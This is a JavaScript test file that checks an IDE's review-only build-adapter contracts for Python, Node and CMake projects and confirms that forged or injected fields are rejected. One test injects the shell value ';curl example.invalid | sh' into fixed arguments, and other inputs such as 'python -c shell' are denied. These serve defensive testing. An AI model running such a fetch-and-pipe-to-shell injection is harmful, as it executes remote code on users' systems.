import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {planReviewedAdapterRequest,checkedReviewedAdapterContract}
  from '../web/reviewed_adapters.js';

const PROJECT='ide-'+'a'.repeat(32),FOREIGN='ide-'+'b'.repeat(32);
const SHA='c'.repeat(64),HEAD='d'.repeat(40),FINGERPRINT='e'.repeat(64);
const guards=[
  'reviewed_immutable_interpreter_bundle',
  'registered_snapshot_sha_verified_at_admission',
  'no_network_or_host_credentials',
  'readonly_source_private_output',
  'preexec_os_containment_and_resource_limits',
  'fresh_single_job_native_os_approval',
  'bounded_stdio_artifact_hashes',
  'descendant_kill_and_durable_recovery_receipt',
];
const specs={
  python_pytest:{manifest:'pyproject.toml',bundle:'python_pytest_bundle_unverified',
    steps:[['pytest_fixed','reviewed_python_interpreter',
      ['-I','-m','pytest','-q','-p','no:cacheprovider'],'sealed_workspace_only']]},
  js_tests:{manifest:'package.json',bundle:'node_builtin_test_bundle_unverified',
    steps:[['node_builtin_test_fixed','reviewed_node_runtime',
      ['--test','--test-reporter=tap'],'sealed_workspace_only']]},
  cpp_cmake_build:{manifest:'CMakeLists.txt',bundle:'cmake_ninja_ctest_bundle_unverified',
    steps:[
      ['cmake_configure_fixed','reviewed_cmake_and_ninja_bundle',
        ['-S','/workspace','-B','/output/build','-G','Ninja',
         '-DCMAKE_BUILD_TYPE=Debug'],'sealed_workspace_only'],
      ['cmake_build_fixed','reviewed_cmake_and_ninja_bundle',
        ['--build','/output/build','--parallel','1'],
        'sealed_output_from_prior_step_only'],
      ['ctest_fixed','reviewed_ctest_bundle',
        ['--test-dir','/output/build','--output-on-failure'],
        'sealed_output_from_prior_step_only'],
    ]},
};
const catalog={
  projectId:PROJECT,executionAuthorized:false,
  profiles:Object.entries(specs).map(([id,spec])=>({
    id,existingRecipe:null,manifest:spec.manifest,
    manifestState:'saved_file_sha_observed_not_validated',sha:SHA,
  })),
};
const request=id=>({projectId:PROJECT,profileId:id,
  expectedSavedManifestSha256:SHA});
function fixture(id) {
  const spec=specs[id];
  return {schemaVersion:1,projectId:PROJECT,profileId:id,
    manifestRelativePath:spec.manifest,
    observedSavedManifestSha256:SHA,
    observedCleanGitHead:HEAD,
    reviewFingerprint:FINGERPRINT,
    toolchainBundleId:spec.bundle,
    steps:spec.steps.map(([stepId,toolId,fixedArgs,inputOrigin])=>({
      stepId,toolId,fixedArgs,inputOrigin,
      authority:'contract_only_not_executable',
    })),
    requiredGuards:[...guards],
    reviewState:'native_contract_observed_not_approved',
    snapshotState:'not_sealed',toolchainState:'not_pinned_or_installed',
    nativeWorkerState:'no_reviewed_platform_adapter',
    executionAuthorized:false,commandDispatched:false,
    sourceTextExported:false,installedAppAccepted:false,
  };
}
test('three fixed native preflight contracts are accepted as review-only',()=>{
  for(const id of Object.keys(specs)){
    const req=planReviewedAdapterRequest(catalog,PROJECT,id);
    assert.deepEqual(req,request(id));
    const checked=checkedReviewedAdapterContract(fixture(id),req);
    assert.equal(checked.reviewOnly,true);
    assert.equal(checked.runnable,false);
    assert.equal(checked.steps.length,specs[id].steps.length);
    assert.equal(checked.cleanGitHead,HEAD);
    assert.equal(checked.fingerprint,FINGERPRINT);
  }
});
test('review request never transmits manifest bytes, commands or executable paths',()=>{
  const result=planReviewedAdapterRequest(catalog,PROJECT,'js_tests');
  assert.deepEqual(Object.keys(result),
    ['projectId','profileId','expectedSavedManifestSha256']);
  assert.equal(JSON.stringify(result).includes('npm'),false);
  assert.equal(JSON.stringify(result).includes('test-runner'),false);
});
test('unknown profile and arbitrary user-supplied scripts are denied',()=>{
  for(const bad of ['rust_build','npm run test','python -c shell','../outside','']){
    assert.throws(()=>planReviewedAdapterRequest(catalog,PROJECT,bad),
      /DEV03_ADAPTER_NOT_REVIEWABLE/);
  }
});
test('old foreign source or missing saved manifest cannot be reviewed',()=>{
  assert.throws(()=>planReviewedAdapterRequest(catalog,FOREIGN,'python_pytest'),
    /DEV03_ADAPTER_NOT_REVIEWABLE/);
  const stale={...catalog,profiles:catalog.profiles.map((p,i)=>
    i===0?{...p,sha:'f'.repeat(64),manifestState:'not_found'}:p)};
  assert.throws(()=>planReviewedAdapterRequest(stale,PROJECT,'python_pytest'),
    /DEV03_ADAPTER_MANIFEST_NOT_REVIEWABLE/);
});
test('cannot forge reviewed source identity or fingerprint',()=>{
  for(const patch of [
    {projectId:FOREIGN},{observedCleanGitHead:'bad'},
    {observedSavedManifestSha256:'f'.repeat(64)},
    {reviewFingerprint:'bad'},
    {manifestRelativePath:'../package.json'},
    {toolchainBundleId:'arbitrary_node.exe'},
  ]) {
    assert.throws(()=>checkedReviewedAdapterContract(
      {...fixture('js_tests'),...patch},request('js_tests')),
      /DEV03_ADAPTER_CONTRACT_UNTRUSTED/);
  }
});
test('cannot forge execution permission, toolchain installation or OS acceptance',()=>{
  for(const patch of [
    {executionAuthorized:true},{commandDispatched:true},
    {sourceTextExported:true},{installedAppAccepted:true},
    {toolchainState:'verified'},{nativeWorkerState:'ready'},
    {snapshotState:'sealed'},
    {reviewState:'approved'},
  ]) {
    assert.throws(()=>checkedReviewedAdapterContract(
      {...fixture('python_pytest'),...patch},request('python_pytest')),
      /DEV03_ADAPTER_CONTRACT_UNTRUSTED/);
  }
});
test('fixed args reject shell metacharacters, injected flags and swapped steps',()=>{
  const good=fixture('cpp_cmake_build');
  assert.equal(checkedReviewedAdapterContract(good,request('cpp_cmake_build')).steps.length,3);
  const injected=fixture('cpp_cmake_build');
  injected.steps[0].fixedArgs.push(';curl example.invalid | sh');
  assert.throws(()=>checkedReviewedAdapterContract(injected,
    request('cpp_cmake_build')),/DEV03_ADAPTER_STEPS_UNTRUSTED/);
  const swapped=fixture('cpp_cmake_build');
  swapped.steps.reverse();
  assert.throws(()=>checkedReviewedAdapterContract(swapped,
    request('cpp_cmake_build')),/DEV03_ADAPTER_STEPS_UNTRUSTED/);
});
test('requires all eight independent runtime and kernel cleanup gates',()=>{
  const fake=fixture('js_tests');
  fake.requiredGuards[0]='download_node_from_internet';
  assert.throws(()=>checkedReviewedAdapterContract(fake,request('js_tests')),
    /DEV03_ADAPTER_CONTRACT_UNTRUSTED/);
  const missing=fixture('js_tests');
  missing.requiredGuards.pop();
  assert.throws(()=>checkedReviewedAdapterContract(missing,
    request('js_tests')),/DEV03_ADAPTER_CONTRACT_UNTRUSTED/);
});
test('source uses registered browser and clean HEAD, never a WebView path',()=>{
  const host=readFileSync(new URL('../../host/src/reviewed_adapters.rs',
    import.meta.url),'utf8');
  const command=readFileSync(new URL('../src-tauri/src/lib.rs',
    import.meta.url),'utf8');
  assert.match(host,/self\.source_capability\(project_id\)/);
  assert.match(host,/self\.registered_git_root\(project_id\)/);
  assert.match(host,/self\.inspect_git_worktree\(project_id\)/);
  assert.match(host,/self\.preview_source_file\(project_id, adapter\.manifest_path\)/);
  assert.match(host,/after\.local_head != before\.local_head/);
  assert.match(host,/native_worker_state: "no_reviewed_platform_adapter"/);
  assert.doesNotMatch(host,/Command::new|std::process::Command|tokio::process/);
  assert.match(command,/async fn ide_review_multilang_adapter\(/);
  assert.match(command,/ide_review_multilang_adapter,/);
});
test('UI cannot convert reviewed adapter contract to an executable job',()=>{
  const ui=readFileSync(new URL('../web/main.jsx',import.meta.url),'utf8');
  const begin=ui.indexOf('async function inspectReviewedMultilangAdapter(profileId)');
  const end=ui.indexOf('function chooseProjectRunProfile(profileId)',begin);
  assert.ok(begin>=0&&end>begin);
  const handler=ui.slice(begin,end);
  assert.match(handler,/invoke\('ide_review_multilang_adapter',requestPlan\)/);
  assert.doesNotMatch(handler,/ide_build_start|ide_build_cancel|Command|spawn\(|shell|eval\(/);
  assert.match(ui,/Non-executable adapter review/);
  assert.match(ui,/Contract only — execution blocked/);
});
test('typed capability schema declares read-only non-executable review only',()=>{
  const source=readFileSync(new URL('../../host/src/capability_schemas.json',
    import.meta.url),'utf8');
  const catalog=readFileSync(new URL('../../host/src/capabilities.rs',
    import.meta.url),'utf8');
  const schema=JSON.parse(source);
  const op=schema.operations['job.reviewAdapter'];
  assert.deepEqual(op.request.required,
    ['projectId','profileId','expectedSavedManifestSha256']);
  assert.equal(op.result.$ref,'#/$defs/ReviewedAdapterContract');
  const result=schema.definitions.ReviewedAdapterContract;
  assert.equal(result.properties.executionAuthorized.const,false);
  assert.equal(result.properties.commandDispatched.const,false);
  assert.equal(result.properties.snapshotState.const,'not_sealed');
  assert.equal(result.properties.nativeWorkerState.const,'no_reviewed_platform_adapter');
  assert.match(catalog,/"job.reviewAdapter"/);
  assert.match(catalog,/"ide_review_multilang_adapter"/);
});
